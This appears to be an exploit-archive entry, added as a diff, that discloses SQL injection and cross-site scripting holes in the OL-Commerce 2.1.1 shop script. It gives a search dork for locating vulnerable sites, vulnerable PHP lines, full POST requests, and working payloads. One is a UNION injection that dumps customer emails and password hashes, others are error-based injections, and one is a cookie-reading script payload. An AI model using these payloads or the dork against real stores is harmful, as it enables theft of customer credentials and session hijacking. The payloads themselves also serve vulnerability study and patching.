@@ -1,0 +1,284 @@
+id: 22448
+date: 07/18/2014
+title: OL-Commerce 2.1.1 Cross Site Scripting / SQL Injection Vulnerabilities
+author: AtT4CKxT3rR0r1ST
+cves: 
+
+OL-Commerce v2.1.1 - Multiple Vulnerabilties
+===================================================================
+
+####################################################################
+.:. Author         : AtT4CKxT3rR0r1ST
+.:. Contact        : [F.Hack@w.cn] , [AtT4CKxT3rR0r1ST@gmail.com]
+.:. Home           : http://www.iphobos.com/blog/
+.:. Script         :
+http://sourceforge.net/projects/ol-commerce/?source=directory
+.:. Dork           : inurl:"affiliate_signup.php"  intext:"Mr:"
+####################################################################
+
+[1] Multiple Sql Injection
+===========================
+VULNERABILITY
+##############
+[I] /affiliate_signup.php
+
+Line 53:
+                       $a_company =
+olc_db_prepare_input($_POST['a_company']);
+
+Line 169-175:
+            $check_query = olc_db_query("select count(*) as total from " .
+TABLE_ZONES . " where zone_country_id = '" . olc_db_input($a_country) .
+"'");
+            $check_value = olc_db_fetch_array($check_query);
+            $entry_state_has_zones = ($check_value['total'] > 0);
+            if ($entry_state_has_zones) {
+                $zone_query = olc_db_query("select zone_id from " .
+TABLE_ZONES . " where zone_country_id = '" . olc_db_input($a_country) . "'
+and zone_name = '" . olc_db_input($a_state) . "'");
+                if (olc_db_num_rows($zone_query) == 1) {
+                    $zone_values = olc_db_fetch_array($zone_query);
+
+#########
+EXPLOIT
+#########
+Type: Post String Mysql Injection
+
+http://localhost/OL-Commerce/affiliate_signup.php
+
+POST /OL-Commerce/affiliate_signup.php HTTP/1.1
+Host: localhost
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:26.0) Gecko/20100101
+Firefox/26.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://localhost/o/affiliate_signup.php
+Cookie:
+Connection: keep-alive
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 629
+
+action=process&a_gender=m&a_firstname=haha&a_lastname=hahasdf&a_dob=457689
+&a_email_address=email@hotmail.com&a_company=iiiiii&a_company_taxid=12
+&a_payment_check=jjjjjj&a_payment_paypal=email@hotmail.com
+&a_payment_bank_name=paypal
+&a_payment_bank_branch_number=555555&a_payment_bank_swift_code=444444
+&a_payment_bank_account_name=qqqqqq&a_payment_bank_account_number=3333333
+&a_street_address=ddddddd&a_suburb=ccccccf&a_postcode=00961&a_city=bbbbbb
+&a_country=118[SQL
+INJECTION]&a_state=aaaaaa&a_telephone=22222222&a_fax=11111111&
+a_homepage=http://iphobos.com/blog&a_password=12121212
+&a_confirmation=12121212&a_agb=1&x=65&y=3
+
+
+[NOTE]
+------
+a_country=118[SQL INJECTION]=118' and 1=2 union all select
+group_concat(customers_id,0x3a,customers_email_address,0x3a,customers_password)+from+customers--
+-
+
+VULNERABILITY
+##############
+[II] /affiliate_show_banner.php (line 107-120)
+
+if (isset($_GET['ref'])) $affiliate_id = $_GET['ref'];
+if (isset($_POST['ref'])) $affiliate_id = $_POST['ref'];
+
+if (isset($_GET['affiliate_banner_id'])) $banner_id =
+$_GET['affiliate_banner_id'];
+if (isset($_POST['affiliate_banner_id'])) $banner_id =
+$_POST['affiliate_banner_id'];
+if (isset($_GET['affiliate_pbanner_id'])) $prod_banner_id =
+$_GET['affiliate_pbanner_id'];
+if (isset($_POST['affiliate_pbanner_id'])) $prod_banner_id =
+$_POST['affiliate_pbanner_id'];
+
+
+
+if (!empty($banner_id)) {
+    $is_banner = 'true';
+    $sql = "select affiliate_banners_image, affiliate_products_id from " .
+TABLE_AFFILIATE_BANNERS . " where affiliate_banners_id = " . $banner_id  .
+" and affiliate_status = 1";
+    $banner_values = olc_db_query($sql);
+
+#########
+EXPLOIT
+#########
+Type: Double Query
+
+
+http://localhost/OL-Commerce/affiliate_show_banner.php?ref=1&affiliate_banner_id=1[SQL
+INJECTION]
+
+VULNERABILITY
+##############
+[III] /create_account.php
+
+Line 75:
+
+ $country = olc_db_prepare_input($_POST['country']);
+
+Line 218-219:
+
+      $check_query = olc_db_query("select count(*) as total from " .
+TABLE_ZONES . " where zone_country_id = '" . (int)$country . "'");
+      $check = olc_db_fetch_array($check_query);
+
+
+#########
+EXPLOIT
+#########
+Type: Post String Double Query
+
+
+http://localhost/OL-Commerce/create_account.php
+
+POST /OL-Commerce/create_account.php  HTTP/1.1
+Host: localhost
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:26.0) Gecko/20100101
+Firefox/26.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://localhost/OL-Commerce/create_account.php
+Cookie:
+Connection: keep-alive
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 301
+
+
+action=process&gender=m&firstname=aaaaa&lastname=bbbb
+&dob=17.05.1991&email_address=email@hotmail.com
+&company=ccc&vat=1234&street_address=dddd&suburb=eeee
+&postcode=00961&city=fffff&state=gggggg
+&country=118[SQL
+INJECTION]&telephone=45345325&fax=234234&password=12121212&confirmation=12121212&x=28&y=4
+
+[NOTE]
+------
+country=118[SQL INJECTION]=118' and (select 1 from (select
+count(*),concat((select(select
+concat(cast(concat(database(),0x3a,version()) as char),0x7e)) from
+information_schema.tables limit 0,1),floor(rand(0)*2))x from
+information_schema.tables group by x)a) and 1=1-- -
+
+VULNERABILITY
+##############
+[V] /admin/create_account.php
+
+Line 57:
+
+  $entry_country_id = olc_db_prepare_input($_POST['entry_country_id']);
+
+Line 208-209:
+
+        $check_query = olc_db_query("select count(*) as total from " .
+TABLE_ZONES . " where zone_country_id = '" .
+olc_db_input($entry_country_id) . "'");
+        $check_value = olc_db_fetch_array($check_query);
+
+
+#########
+EXPLOIT
+#########
+Type: Post String Double Query
+
+http://localhost/OL-Commerce/admin/create_account.php?action=edit
+
+POST /OL-Commerce/admin/create_account.php?action=edit  HTTP/1.1
+Host: localhost
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:26.0) Gecko/20100101
+Firefox/26.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://localhost/OL-Commerce/admin/create_account.php?action=edit
+Cookie:
+Connection: keep-alive
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 301
+
+default_address_id=&customers_gender=m&csID=100&customers_firstname=aaaa
+&customers_lastname=bbbb&customers_email_address=email@hotmail.com
+&entry_company=cccc&customers_vat_id=1212&entry_street_address=dddd
+&entry_postcode=00961&entry_city=eeee&entry_country_id=118[SQL INJECTION]
+&customers_telephone=12121233&customers_fax=23421424&status=0
+&customers_mail=yes&payment_unallowed=&shipping_unallowed=
+&entry_password=12121212&mail_comments=
+
+[NOTE]
+------
+entry_country_id=118[SQL INJECTION]=118' and (select 1 from (select
+count(*),concat((select(select
+concat(cast(concat(database(),0x3a,version()) as char),0x7e)) from
+information_schema.tables limit 0,1),floor(rand(0)*2))x from
+information_schema.tables group by x)a) and 1=1-- -
+
+
+[2] Multiple Post Cross Site Scripting
+=======================================
+
+[I]http://localhost/OL-Commerce/affiliate_signup.php
+
+POST /OL-Commerce/affiliate_signup.php HTTP/1.1
+Host: localhost
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:26.0) Gecko/20100101
+Firefox/26.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://localhost/o/affiliate_signup.php
+Cookie:
+Connection: keep-alive
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 629
+
+action=process&a_gender=m&a_firstname=haha&a_lastname=hahasdf&a_dob=457689
+&a_email_address=email@hotmail.com&a_company=iiiiii&a_company_taxid=12
+&a_payment_check=jjjjjj&a_payment_paypal=email@hotmail.com
+&a_payment_bank_name=paypal
+&a_payment_bank_branch_number=555555&a_payment_bank_swift_code=444444
+&a_payment_bank_account_name=qqqqqq&a_payment_bank_account_number=3333333
+&a_street_address=ddddddd&a_suburb=ccccccf&a_postcode=00961&a_city=bbbbbb
+&a_country=118[XSS]&a_state=aaaaaa&a_telephone=22222222&a_fax=11111111&
+a_homepage=http://iphobos.com/blog&a_password=12121212
+&a_confirmation=12121212&a_agb=1&x=65&y=3
+
+
+[NOTE]
+------
+a_country=118[XSS]=118'%22()%26%25<ScRiPt%20>prompt(document.cookie)</ScRiPt>
+
+
+[II]http://localhost/OL-Commerce/admin/create_account.php?action=edit
+
+POST /OL-Commerce/admin/create_account.php?action=edit  HTTP/1.1
+Host: localhost
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:26.0) Gecko/20100101
+Firefox/26.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://localhost/OL-Commerce/admin/create_account.php?action=edit
+Cookie:
+Connection: keep-alive
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 301
+
+default_address_id=&customers_gender=m&csID=100&customers_firstname=aaaa
+&customers_lastname=bbbb&customers_email_address=email@hotmail.com
+&entry_company=cccc&customers_vat_id=1212&entry_street_address=dddd
+&entry_postcode=00961&entry_city=eeee&entry_country_id=118[XSS]
+&customers_telephone=12121233&customers_fax=23421424&status=0
+&customers_mail=yes&payment_unallowed=&shipping_unallowed=
+&entry_password=12121212&mail_comments=
+
+[NOTE]
+------
+entry_country_id=118[XSS]=118'%22()%26%25<ScRiPt%20>prompt(document.cookie)</ScRiPt>
+
+####################################################################
+
+#  0day.today [2023-03-25]  #
